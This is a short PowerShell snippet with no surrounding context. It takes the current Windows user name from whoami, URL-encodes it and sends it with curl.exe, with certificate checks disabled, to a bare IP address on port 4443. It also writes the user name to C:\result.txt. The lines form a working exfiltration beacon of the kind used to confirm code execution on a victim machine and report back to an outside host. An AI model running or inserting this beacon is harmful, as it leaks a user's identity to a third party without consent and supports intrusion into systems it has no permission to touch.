$user = [uri]::EscapeDataString((whoami))
curl.exe "https://206.189.113.121:4443/$user" -k
whoami > C:\result.txt
